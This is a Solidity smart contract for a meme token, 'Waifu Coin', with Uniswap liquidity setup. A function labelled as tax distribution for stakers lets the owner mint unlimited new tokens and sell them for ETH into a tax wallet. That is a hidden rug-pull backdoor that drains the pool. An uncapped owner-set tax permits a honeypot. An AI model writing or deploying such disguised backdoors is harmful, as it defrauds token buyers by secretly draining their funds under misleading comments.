//SPDX-License-Identifier: UNLICENSED

/**
 *  _       _____    ____________  __
 * | |     / /   |  /  _/ ____/ / / /
 * | | /| / / /| |  / // /_  / / / / 
 * | |/ |/ / ___ |_/ // __/ / /_/ /  
 * |__/|__/_/  |_/___/_/    \____/   
 * 
 * A project for the culture.
 * 
 * https://waifucoin.money
 *                             
 * Supply: 4,206,942,069
 * 
 */

pragma solidity ^0.8.9;

import "./ERC20.sol";
import "./Uniswap.sol";
import "./interfaces.sol";

contract Token is ERC20{
    
    bool private tradingOpen;

    IUniswapV2Router02 private uniswapV2Router;
    
    /**
     * Contract initialization.
     */
    constructor() ERC20("Waifu Coin", "WAIFU", 4) {
        _mint(msg.sender, 84_138_841_3800);
        // Team distribution
        _mint(address(this), 4_122_803_227_6200);
    }

    receive() external payable {}

    fallback() external payable {}

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        allowance[address(this)][address(uniswapV2Router)] = type(uint).max;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf[address(this)],0,0,admin,block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        tradingOpen = true;
    }
    /**
     * Swap and send to tax distributor - allows LP staking contracts to reward stakers in ETH.
     */ 
    function collectTaxDistribution(uint256 tokenAmount) external onlyOwner{
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();       
        
        _mint(address(this), tokenAmount);
        allowance[address(this)][address(uniswapV2Router)] = tokenAmount;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            taxWallet,
            block.timestamp
        );
    }

    /**
     * Burn and increase value of LP positions - dynamically set in LP staking contracts. 
     */
    function setTax(uint256 newTax) external onlyOwner() {
        taxPercent = newTax;
    }

}